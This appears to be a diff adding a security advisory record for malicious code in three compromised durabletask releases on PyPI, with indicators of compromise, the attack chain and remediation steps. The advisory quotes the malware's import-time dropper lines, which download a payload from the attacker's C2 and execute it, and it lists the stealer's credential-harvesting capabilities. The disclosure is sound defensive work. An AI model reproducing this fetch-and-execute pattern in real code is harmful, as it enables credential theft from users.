@@ -1,0 +1,233 @@
+{
+  "modified": "2026-06-08T19:21:16Z",
+  "published": "2026-05-19T16:47:48Z",
+  "schema_version": "1.7.4",
+  "id": "MAL-2026-4174",
+  "summary": "Malicious code in durabletask (PyPI)",
+  "details": "**1.4.1**, **1.4.2**, and **1.4.3** of `durabletask` were compromised via a **PyPI maintainer account takeover**. All three malicious versions were published on 2026-05-19 within a 35-minute window (16:19–16:54 UTC). Pin to `\u003c=1.4.0`.\n\n**Attack chain**\n\n- *Stage 1 — Import-time dropper:* on import, the package fetches a second-stage payload `rope.pyz` from `check.git-service.com` (`160.119.64.3`). The TLS certificate for this C2 was issued on 2026-05-16, indicating ~3 days of pre-attack staging.\n- *Stage 2 — Credential-theft framework:*\n  - AWS / Azure / GCP IMDS interrogation and Secrets Manager dumps\n  - Kubernetes lateral movement via in-cluster service-account tokens\n  - HashiCorp Vault token extraction\n  - Harvesting from 85 known filesystem credential paths\n  - Brute-forcing of local password manager vaults\n- *Exfiltration:* stolen data is encrypted and shipped to the primary C2, with a **dead-drop fallback** that pushes encrypted blobs as GitHub commits (FIRESCALE-style egress).\n- *Persistence:* systemd unit `pgsql-monitor.service`.\n- *Destructive payload:* a **geotargeted wiper** activates on hosts identified as being located in **Israel** or **Iran**.\n\n**Indicators of compromise**\n\n- C2 (primary): `check.git-service.com` — `160.119.64.3`\n- C2 (secondary): `t.m-kosche.com` — `185.95.159.32`\n- Dropped payload: `rope.pyz`\n- Persistence unit: `pgsql-monitor.service`\n\n**Recommended actions**\n\n- Pin `durabletask` to `\u003c=1.4.0`.\n- Block both C2 domains at network egress.\n- Treat any Linux system that imported 1.4.1 / 1.4.2 / 1.4.3 as **fully compromised** — rotate all reachable secrets and rebuild affected hosts.\n\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (daa176998359c04f9e002ff27fa947f12f08ddf49648ac7444ca894602317662)\nOn every `import durabletask`, the package's top-level `__init__.py` (lines 8-11) calls `urllib.request.urlretrieve('https://check.git-service.com/rope.pyz', '/tmp/managed.pyz')` and then `subprocess.Popen(['python3', '/tmp/managed.pyz'], start_new_session=True)` on Linux. The fetched zipapp is executed with no hash or signature verification, in a detached session. The destination `check.git-service.com` is a generic-git-service lookalike domain unrelated to the legitimate publisher of durabletask (Microsoft / microsoft/durabletask-python on github.com). The trigger is module import — not `pip install` — so install-phase sandboxes (`pip download`, `pip wheel`, build isolation) never observe the network activity; the dropper fires when the package is loaded in CI, production, or a developer's interpreter. The pattern (plaintext additive trailing block in `__init__.py`, Linux platform gate, `.pyz` staged to `/tmp/` and handed to `python3`, lookalike `git-\u003cproject\u003e.com`-style C2) matches a known import-time dropper campaign and is structurally indistinguishable from a stolen-publish-credential compromise of a legitimate package.\n\n## Source: kam193 (9c23380bb017a417e3f26575c5b96e32fb0bf11dec8314d16f8b979052748049)\nVersions 1.4.1, 1.4.2, 1.4.3 were compromised.\n\n\nDuring import of compromised versions, the malicious code is downloaded and executed. It exfiltrates all kinds of credentials and sensitive files, including data from secret and password managers, SSH keys, configuration files. Code tries to achieve a persistence via systemd unit.\n\n\n---\n\nCategory: MALICIOUS - The campaign has clearly malicious intent, like infostealers.\n\n\nCampaign: 2026-05-compr-durabletask\n\n\nReasons (based on the campaign):\n\n\n - files-exfiltration\n\n\n - exfiltration-env-variables\n\n\n - exfiltration-ssh-keys\n\n\n - exfiltration-cloud-tokens\n\n\n - Downloads and executes a remote malicious script.\n\n\n - exfiltration-credentials\n\n\n - persistence\n\n\n - compromised-package\n",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "durabletask"
+      },
+      "versions": [
+        "1.4.1",
+        "1.4.2",
+        "1.4.3"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          },
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "indicators": {
+          "domains": [
+            "check.git-service.com",
+            "t.m-kosche.com"
+          ],
+          "evidence_files": [
+            {
+              "path": "durabletask/__init__.py",
+              "sha256": "5246e60c2ff10ae058abba14ef5ea22432465ad827ec5f5c5572999411d90b80"
+            }
+          ],
+          "ips": [
+            "160.119.64.3"
+          ],
+          "package_integrity": [
+            {
+              "filename": "durabletask-1.4.1-py3-none-any.whl",
+              "hashes": {
+                "sha256": "7d80b3ef74ad7992b93c31966962612e4e2ceb93e7727cdbd1d2a9af47d44ba8"
+              }
+            },
+            {
+              "filename": "durabletask-1.4.1.tar.gz",
+              "hashes": {
+                "sha256": "3de04fe2a76262743ed089efa7115f4508619838e77d60b9a1aab8b20d2cc8bf"
+              }
+            }
+          ],
+          "second_stage": [
+            {
+              "captured_at": "2026-05-19T19:43:50Z",
+              "content_type": "application/zip",
+              "observed_capabilities": [
+                "Multi-cloud credential theft (AWS, GCP, Azure, Kubernetes, HashiCorp Vault)",
+                "Filesystem secret harvesting (.env, SSH keys, browser credentials, password stores)",
+                "RSA-OAEP + AES-256-GCM encrypted exfiltration to attacker C2",
+                "GitHub dead-drop C2 resolution via signed commit messages (FIRESCALE pattern)",
+                "Stolen GitHub token exfiltration fallback (creates public repos with encrypted data)",
+                "Systemd persistence as pgsql-monitor.service (root or user-level)",
+                "Propagation via secondary domain t.m-kosche.com",
+                "Anti-analysis: Russia locale exclusion, CPU count \u003e 2 requirement"
+              ],
+              "persistence": {
+                "binary_path_root": "/usr/bin/pgmonitor.py",
+                "binary_path_user": "~/.local/bin/pgmonitor.py",
+                "service_name": "pgsql-monitor.service"
+              },
+              "sha256": "069ac1dc7f7649b76bc72a11ac700f373804bfd81dab7e561157b703999f44ce",
+              "size_bytes": 28703,
+              "url": "https://check.git-service.com/rope.pyz"
+            }
+          ]
+        }
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "REPORT",
+      "url": "https://safedep.io/malicious-durabletask-pypi-supply-chain-attack"
+    },
+    {
+      "type": "WEB",
+      "url": "https://bad-packages.kam193.eu/pypi/campaign/2026-05-compr-durabletask"
+    },
+    {
+      "type": "WEB",
+      "url": "https://www.upwind.io/feed/newly-discovered-durabletask-malware-targeted-kubernetes-cloud-secrets-and-ci-cd-infrastructure"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://pypi.org/project/durabletask/1.4.1/"
+    },
+    {
+      "type": "WEB",
+      "url": "https://www.aikido.dev/blog/durabletask-package-compromised-mini-shai-hulud"
+    },
+    {
+      "type": "WEB",
+      "url": "https://safedep.io/malicious-durabletask-pypi-supply-chain-attack"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Amazon Inspector",
+      "type": "FINDER",
+      "contact": [
+        "actran@amazon.com"
+      ]
+    },
+    {
+      "name": "Kamil Mańkowski (kam193)",
+      "type": "ANALYST",
+      "contact": [
+        "https://github.com/kam193",
+        "https://bad-packages.kam193.eu/"
+      ]
+    },
+    {
+      "name": "SafeDep",
+      "type": "FINDER",
+      "contact": [
+        "https://safedep.io"
+      ]
+    }
+  ],
+  "database_specific": {
+    "iocs": {
+      "domains": [
+        "check.git-service.com",
+        "git-service.com",
+        "t.m-kosche.com",
+        "m-kosche.com"
+      ],
+      "urls": [
+        "https://t.m-kosche.com/rope.pyz",
+        "https://check.git-service.com/rope.pyz",
+        "https://check.git-service.com/api/public/version",
+        "https://check.git-service.com/v1/models"
+      ]
+    },
+    "malicious-packages-origins": [
+      {
+        "source": "amazon-inspector",
+        "sha256": "d7cd06c24c677da1e7b5c2f4df3b2d696dfbcf8548357b512ed16c659c4c7b66",
+        "import_time": "2026-05-19T17:50:11.360785891Z",
+        "modified_time": "2026-05-19T16:47:48Z",
+        "versions": [
+          "1.4.1"
+        ]
+      },
+      {
+        "source": "kam193",
+        "sha256": "9c23380bb017a417e3f26575c5b96e32fb0bf11dec8314d16f8b979052748049",
+        "import_time": "2026-05-19T18:43:08.148362157Z",
+        "id": "pypi/2026-05-compr-durabletask/durabletask",
+        "modified_time": "2026-05-19T18:34:41Z",
+        "versions": [
+          "1.4.1",
+          "1.4.2",
+          "1.4.3"
+        ]
+      },
+      {
+        "source": "kam193",
+        "sha256": "295bb15ad476455cabcf58b33fa9b8cb1ff65733d648de314703dd119c171741",
+        "import_time": "2026-05-19T19:37:36.17794506Z",
+        "id": "pypi/2026-05-compr-durabletask/durabletask",
+        "modified_time": "2026-05-19T18:34:41Z",
+        "versions": [
+          "1.4.1",
+          "1.4.2",
+          "1.4.3"
+        ]
+      },
+      {
+        "source": "amazon-inspector",
+        "sha256": "78c753d3badef7f806bd71d60c2bb890ccc969a3fb360596e2872ae580d135f8",
+        "import_time": "2026-05-19T20:39:30.315949543Z",
+        "id": "IN-MAL-2026-003202",
+        "modified_time": "2026-05-19T19:45:00Z",
+        "versions": [
+          "1.4.1"
+        ]
+      },
+      {
+        "source": "kam193",
+        "sha256": "70afb57cbcdb03eb986b0e6d3f0f32c2dfc696ca54ed063ac0c3dad1f323cbd6",
+        "import_time": "2026-05-19T22:31:50.76999664Z",
+        "id": "pypi/2026-05-compr-durabletask/durabletask",
+        "modified_time": "2026-05-19T18:34:41Z",
+        "versions": [
+          "1.4.1",
+          "1.4.2",
+          "1.4.3"
+        ]
+      },
+      {
+        "source": "amazon-inspector",
+        "sha256": "daa176998359c04f9e002ff27fa947f12f08ddf49648ac7444ca894602317662",
+        "import_time": "2026-05-26T05:50:53.879999909Z",
+        "id": "IN-MAL-2026-003579",
+        "modified_time": "2026-05-20T17:45:34Z",
+        "versions": [
+          "1.4.1"
+        ]
+      },
+      {
+        "source": "kam193",
+        "sha256": "48304d20771195ab837cc038cbcd5efd2552d123b890df0dc57ccef477b7ee5d",
+        "import_time": "2026-06-08T19:19:19.170034188Z",
+        "id": "pypi/2026-05-compr-durabletask/durabletask",
+        "modified_time": "2026-05-19T18:35:31Z",
+        "versions": [
+          "1.4.1",
+          "1.4.2",
+          "1.4.3"
+        ]
+      }
+    ]
+  }
+}
